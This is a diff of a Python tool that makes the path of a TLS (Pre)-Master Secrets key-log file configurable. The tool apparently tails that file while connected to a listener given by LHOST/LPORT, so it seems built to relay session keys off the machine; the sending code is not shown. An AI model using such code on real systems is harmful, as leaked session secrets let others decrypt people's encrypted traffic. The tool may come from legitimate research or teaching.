@@ -32,6 +32,7 @@ def main():
     parser.add_argument('--LHOST', '-LHOST', type=str, help="The IP that is listening on the server.")
     parser.add_argument("--LPORT", "-LPORT", type=int, help="The port that is listening on the server.")
     parser.add_argument("--interactive", action="store_true", help="Initializate the tool in interactive mode.")
+    parser.add_argument("--secrets_path", "-secrets_path", type=str, help="The path to the secrets file.")
     arguments = parser.parse_args()
 
     if (len(sys.argv) == 1):
@@ -47,16 +48,18 @@ def main():
     if (arguments.interactive):
         HOST = str(input(Fore.GREEN + "Enter the IP of the server: ")) # The server's hostname or IP address
         PORT = int(input("Enter the server port: ")) # The port used by the server
+        SECRETS_PATH = str(input(Fore.GREEN + "Enter the path with the (Pre)-Master Secrets: "))
     else:
         HOST = arguments.LHOST
         PORT = arguments.LPORT
+        SECRETS_PATH = arguments.secrets_path
 
     #sslkeylog_path = str(input("Introduce donde desea almacenar las claves: "))
     #configuracion(sslkeylog_path)
 
-    file_exists = os.path.exists("/tmp/key-file.log")
+    file_exists = os.path.exists(SECRETS_PATH)
     try:
-        filesize = os.path.getsize("/tmp/key-file.log")
+        filesize = os.path.getsize(SECRETS_PATH)
     except:
         filesize = 0
 
@@ -68,13 +71,13 @@ def main():
     cert = conn.getpeercert()
 
     while file_exists != True or filesize == 0:
-        file_exists = os.path.exists("/tmp/key-file.log")
+        file_exists = os.path.exists(SECRETS_PATH)
         try:
-            filesize = os.path.getsize("/tmp/key-file.log")
+            filesize = os.path.getsize(SECRETS_PATH)
         except:
             filesize = 0
 
-    f = open("/tmp/key-file.log", "rb")
+    f = open(SECRETS_PATH, "rb")
     filelines = follow(f)
     for line in filelines:
         #print(line)
